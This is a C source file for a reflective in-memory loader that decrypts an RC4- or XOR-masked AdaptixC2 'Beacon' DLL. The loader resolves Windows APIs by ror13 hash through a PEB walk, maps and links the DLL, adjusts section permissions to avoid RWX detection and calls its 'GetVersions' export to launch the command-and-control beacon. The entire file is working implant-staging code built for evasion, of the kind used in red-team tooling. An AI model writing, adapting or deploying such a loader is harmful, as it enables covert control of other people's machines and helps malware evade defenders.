#include <windows.h>
#include "tcg.h"
#include "mask.h"
#include "util.h"

/*
 * Removes RWX from DLL sections after loading, and applies the appropriate permissions based on the section characteristics
 * Masks DLL with RC4 or XOR
 */

void fix_section_permissions ( DLLDATA * dll, char * src, char * dst );
typedef void (WINAPI * _GetVersions)();

/*
 * Crystal Palace convention for getting ahold of data linked with this loader.
 */
char _DLL_[0] __attribute__((section("dll")));
char _MASK_[0] __attribute__((section("mask")));

/*
 * Opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" in loader.spec
 * findModuleByHash gets a reference to the Process Environment Block (PEB) and walks the process' InMemoryOrderModuleList until it finds the target module.
 * findFunctionByHash then walks the Export Address Table (EAT) of a specific module until it finds the target function.
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

void go() {
	char * dst;
	char * src;
    char * key;
	DLLDATA dll;
	IMPORTFUNCS funcs;

	/* find rc4 encrypted or xor encoded Beacon DLL appended to this PIC along with the key*/
	src = GETRESOURCE(_DLL_);
    key = GETRESOURCE(_MASK_);

	/* Unmask Beacon DLL */
	src = unmask_rc4((RESOURCE *)src, (RESOURCE *)key);

	/* parse Beacon DLL! */
	ParseDLL(src, &dll);

	/* allocate memory for it! */
	dst =  KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

	/* load DLL into memory */
	LoadDLL(&dll, src, dst);

	/* setup IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &dll, dst);

	/* fix section permissions */
	fix_section_permissions(&dll, src, dst);

	/* Call the exported AdaptixC2 "GetVersions" function which will trigger the beacon */
	_GetVersions pGetVersions = (_GetVersions)findFunctionByHash((HANDLE)dst, ror13hash("GetVersions"));
	if (pGetVersions != NULL) {
		pGetVersions();
	}

	/* Free the unmasked DLL */
	KERNEL32$VirtualFree(src, 0, MEM_RELEASE);
}
